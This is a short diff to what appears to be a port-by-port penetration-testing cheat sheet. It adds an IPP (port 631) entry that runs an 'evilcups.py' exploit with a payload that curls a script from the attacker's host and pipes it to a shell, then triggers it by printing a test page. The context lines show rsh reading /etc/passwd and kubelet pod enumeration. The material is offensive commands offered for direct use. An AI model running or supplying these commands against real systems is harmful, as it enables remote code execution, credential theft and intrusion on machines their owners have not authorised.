@@ -1188,6 +1188,11 @@ rlogin -l $USERNAME $TARGET
 +---------- Execute Commands ----------+
 rsh -l $USERNAME $TARGET cat /etc/passwd
 
+[*] (631) IPP
+evilcups.py $MYIP $TARGET 'bash -c "curl $MYIP:53/resh|sh"'
+https://$TARGET:631/printers
+Pwned_Printer > Print Test Page
+
 [*] (10249-10250) Kubelet
 +---------- View Pods ----------+
 kubeletctl -s $TARGET pods
